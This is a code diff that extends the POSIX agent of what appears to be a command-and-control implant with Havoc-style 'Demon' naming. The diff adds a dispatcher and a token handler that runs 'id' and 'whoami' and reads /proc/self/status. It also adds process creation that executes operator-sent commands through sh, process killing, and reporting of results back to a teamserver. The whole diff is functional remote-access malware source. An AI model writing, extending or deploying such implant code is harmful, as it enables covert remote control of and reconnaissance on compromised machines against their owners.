@@ -30,20 +30,37 @@ static void send_output(uint32_t reqID, uint32_t cmdID, const char *text);
 static void cmd_fs(uint32_t reqID, PARSER *p);
 static void cmd_proc(uint32_t reqID, PARSER *p);
 static void cmd_socket(uint32_t reqID, PARSER *p);
+void CmdSleep(uint32_t reqID, PARSER *p);
+void CmdExit(uint32_t reqID, PARSER *p);
+void CmdOutput(uint32_t reqID, const char *text);
+void CmdFs(uint32_t reqID, PARSER *p);
+void CmdProcCreate(uint32_t reqID, PARSER *p);
+void CmdProc(uint32_t reqID, PARSER *p);
+void CmdSocket(uint32_t reqID, PARSER *p);
+void CmdPosixToken(uint32_t reqID, PARSER *p);
+static char *run_shell(const char *cmd, size_t *out_len);
 
 /* ── Dispatcher ──────────────────────────────────────────────────────── */
 void CommandDispatcher(uint32_t cmdID, uint32_t reqID, PARSER *parser)
 {
     DEMON_LOG("CommandDispatcher: cmd=0x%x req=0x%x", cmdID, reqID);
 
+    /* COMMAND_NOJOB (10) — heartbeat, nothing to do */
+    if (cmdID == 10) return;
+
+    /* Guard against null parser for commands that need data */
+    if (!parser && cmdID != COMMAND_EXIT) return;
+
     switch (cmdID) {
-    case COMMAND_SLEEP:   CmdSleep(reqID, parser);   break;
-    case COMMAND_EXIT:    CmdExit(reqID, parser);     break;
-    case COMMAND_FS:      CmdFs(reqID, parser);       break;
-    case COMMAND_PROC:    /* fall-through */
-    case COMMAND_PROC_LIST: CmdProc(reqID, parser);  break;
-    case COMMAND_SOCKET:  CmdSocket(reqID, parser);   break;
-    case BEACON_OUTPUT:   /* agent-side BEACON_OUTPUT is a no-op here */ break;
+    case COMMAND_SLEEP:     CmdSleep(reqID, parser);      break;
+    case COMMAND_EXIT:      CmdExit(reqID, parser);        break;
+    case COMMAND_FS:        CmdFs(reqID, parser);          break;
+    case COMMAND_PROC:      CmdProcCreate(reqID, parser);  break;
+    case COMMAND_PROC_LIST: CmdProc(reqID, parser);        break;
+    case COMMAND_TOKEN:     CmdPosixToken(reqID, parser);  break;
+    case COMMAND_SOCKET:    CmdSocket(reqID, parser);      break;
+    case COMMAND_SCREENSHOT: CmdOutput(reqID, "[-] Screenshot not supported on this platform\n"); break;
+    case BEACON_OUTPUT:     /* agent-side is a no-op */ break;
     default:
         DEMON_LOG("Unknown command 0x%x", cmdID);
         {
@@ -81,6 +98,13 @@ void CmdExit(uint32_t reqID, PARSER *p)
 }
 
 /* ── OUTPUT (send text back to teamserver) ───────────────────────────── */
+/*
+ * BEACON_OUTPUT payload format (matches TeamServer TaskDispatch):
+ *   [4 BE] Type = CALLBACK_OUTPUT (0x0) — sub-type read by TaskDispatch
+ *   [4 BE] length + [N] output bytes   — read by ParseBytes()
+ */
+#define CALLBACK_OUTPUT 0x0
+
 void CmdOutput(uint32_t reqID, const char *text)
 {
     if (!text) return;
@@ -88,6 +112,7 @@ void CmdOutput(uint32_t reqID, const char *text)
     PKG_BUFFER *pkg = PkgCreate(BEACON_OUTPUT, reqID);
     if (!pkg) return;
 
+    PkgAddInt32(pkg, CALLBACK_OUTPUT);  /* sub-type prefix required by TaskDispatch */
     PkgAddString(pkg, text);
 
     size_t   msg_len = 0;
@@ -100,6 +125,36 @@ void CmdOutput(uint32_t reqID, const char *text)
         TransportSendRecv(msg, msg_len, &resp, &resp_len);
         free(msg);
         if (resp) free(resp);
+    }
+}
+
+/* ── TOKEN commands (macOS/Linux/Android) ────────────────────────────── */
+void CmdPosixToken(uint32_t reqID, PARSER *p)
+{
+    if (!p || p->Length < 4) {
+        char *out = run_shell("id 2>&1", NULL);
+        CmdOutput(reqID, out ? out : "");
+        if (out) free(out);
+        return;
+    }
+
+    /* SubCommand is sent as a string in the token packet */
+    char *sub = ParserReadString(p);
+    if (!sub) sub = "";
+
+    if (strncmp(sub, "getuid", 6) == 0 || strncmp(sub, "whoami", 6) == 0 ||
+        strncmp(sub, "list", 4) == 0) {
+        char *out = run_shell("id 2>&1 && whoami 2>&1", NULL);
+        CmdOutput(reqID, out ? out : "");
+        if (out) free(out);
+    } else if (strncmp(sub, "privs-list", 10) == 0) {
+        char *out = run_shell("cat /proc/self/status 2>/dev/null || id 2>&1", NULL);
+        CmdOutput(reqID, out ? out : "");
+        if (out) free(out);
+    } else {
+        char msg[128];
+        snprintf(msg, sizeof(msg), "[-] Token sub-command '%s' not supported on POSIX\n", sub);
+        CmdOutput(reqID, msg);
     }
 }
 
@@ -326,6 +381,82 @@ void CmdFs(uint32_t reqID, PARSER *p)
     default:
         CmdOutput(reqID, "[-] Unknown FS sub-command\n");
         break;
+    }
+}
+
+/* ── Helper: decode UTF-16LE bytes to UTF-8 string ──────────────────── */
+static char *utf16le_to_utf8(const uint8_t *data, uint32_t len)
+{
+    /* Simple ASCII-range UTF-16LE → UTF-8: take every other byte */
+    size_t chars = len / 2;
+    char  *out   = (char *)malloc(chars + 1);
+    if (!out) return NULL;
+    for (size_t i = 0; i < chars; i++) {
+        out[i] = (char)data[i * 2];  /* low byte = ASCII char */
+    }
+    out[chars] = '\0';
+    /* Strip trailing NUL chars */
+    while (chars > 0 && out[chars-1] == '\0') { out[--chars] = '\0'; }
+    return out;
+}
+
+/* ── COMMAND_PROC (0x1010) — Process creation ────────────────────────
+ * Server sends: [subcmd LE][state LE][process UTF-16 bytes LE len+data]
+ *               [args UTF-16 bytes LE len+data][piped LE][verbose LE]
+ *
+ * For POSIX we ignore the Windows process path and just run the args
+ * via sh -c. The args for 'shell <cmd>' are "/c <cmd>" (cmd.exe style)
+ * so we strip the "/c " prefix and run the rest.
+ */
+void CmdProcCreate(uint32_t reqID, PARSER *p)
+{
+    if (!p || p->Length < 4) {
+        CmdOutput(reqID, "[-] PROC: no data\n");
+        return;
+    }
+
+    uint32_t sub = (uint32_t)ParserReadInt32(p);
+
+    if (sub == DEMON_COMMAND_PROC_CREATE) { /* = 4 */
+        /* state */ ParserReadInt32(p);
+
+        /* Process path (UTF-16LE, skip it — we use sh) */
+        uint32_t proc_len = 0;
+        uint8_t *proc_raw = ParserReadBytes(p, &proc_len);
+        (void)proc_raw; (void)proc_len;
+
+        /* Process args (UTF-16LE) — for shell cmd this is "/c <command>" */
+        uint32_t args_len = 0;
+        uint8_t *args_raw = ParserReadBytes(p, &args_len);
+
+        char *args_str = args_raw ? utf16le_to_utf8(args_raw, args_len) : strdup("");
+
+        /* Strip leading "/c " or "/C " (cmd.exe convention) */
+        const char *cmd = args_str ? args_str : "";
+        if (cmd[0] == '/' && (cmd[1] == 'c' || cmd[1] == 'C') && cmd[2] == ' ')
+            cmd += 3;
+
+        /* Execute via sh */
+        char  shell_cmd[4096];
+        snprintf(shell_cmd, sizeof(shell_cmd), "%s", cmd);
+        char  *out = run_shell(shell_cmd, NULL);
+        CmdOutput(reqID, out ? out : "");
+        if (out) free(out);
+        if (args_str) free(args_str);
+
+    } else if (sub == DEMON_COMMAND_PROC_KILL) { /* = 7 */
+        uint32_t pid = (uint32_t)ParserReadInt32(p);
+        char msg[128];
+        if (kill((pid_t)pid, SIGKILL) == 0)
+            snprintf(msg, sizeof(msg), "[+] Killed PID %u\n", pid);
+        else
+            snprintf(msg, sizeof(msg), "[-] kill(%u) failed: %s\n", pid, strerror(errno));
+        CmdOutput(reqID, msg);
+
+    } else {
+        char msg[64];
+        snprintf(msg, sizeof(msg), "[-] PROC sub=0x%x not implemented\n", sub);
+        CmdOutput(reqID, msg);
     }
 }
 
